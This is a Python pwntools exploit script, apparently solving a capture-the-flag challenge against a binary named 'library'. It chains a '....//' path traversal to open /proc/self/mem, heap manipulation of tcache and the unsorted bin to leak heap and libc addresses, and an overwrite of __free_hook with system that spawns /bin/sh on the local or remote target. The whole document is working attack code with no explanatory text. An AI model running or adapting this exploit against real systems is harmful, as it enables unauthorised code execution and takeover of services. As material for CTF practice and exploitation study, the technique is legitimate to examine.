#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('./library')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

send_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())

def open_novel(path):
    send_choice(1)
    p.sendlineafter(b"Novel: ", path)

def read_novel(offset, size):
    send_choice(2)
    p.sendlineafter(b"Enter offset and size: ", f"{offset} {size}".encode())
    return p.recvuntil(b"\n1. Open novel", drop=True)

def edit_novel(offset, size, data):
    send_choice(3)
    p.sendlineafter(b"Enter offset and size: ", f"{offset} {size}".encode())
    assert len(data) < size
    assert b"\n" not in data
    p.sendlineafter(b"Enter edit: ", data)

p = conn()

open_novel(b"....//"*18 + b"/proc/self/mem")

# free 2 tcache chunks
# then reallocate one with uninitialised data for heap leak
edit_novel(0, 0x100, b"aaaa")
heap_leak = u64(read_novel(0, 0x100) + b"\x00\x00")
log.info("heap leak: %#x", heap_leak)

read_novel(0, 0x18)     # target
read_novel(0, 0x408)    # padding
read_novel(0, 0x28)     # top chunk guard

# edit target's size to exactly cover target + padding
edit_novel(heap_leak + 0x108, 0x100, p16(0x431))

# allocate on target (which is still in tcache[0x20]), then free it to unsortedbin
# reallocate with uninitialised data for libc leak
read_novel(0, 0x18)
libc_leak = u64(read_novel(0, 0x428) + b"\x00\x00")
log.info("libc leak: %#x", libc_leak)

libc.address = libc_leak - (libc.sym.main_arena+96)
log.info("libc: %#x", libc.address)

# __free_hook = &system
# --> free("/bin/sh # ...") -> system("/bin/sh # ...") -> system("/bin/sh")
cmd = b"/bin/sh #"
edit_novel(libc.sym.__free_hook-len(cmd), 0x100, cmd+p64(libc.sym.system))
p.interactive()
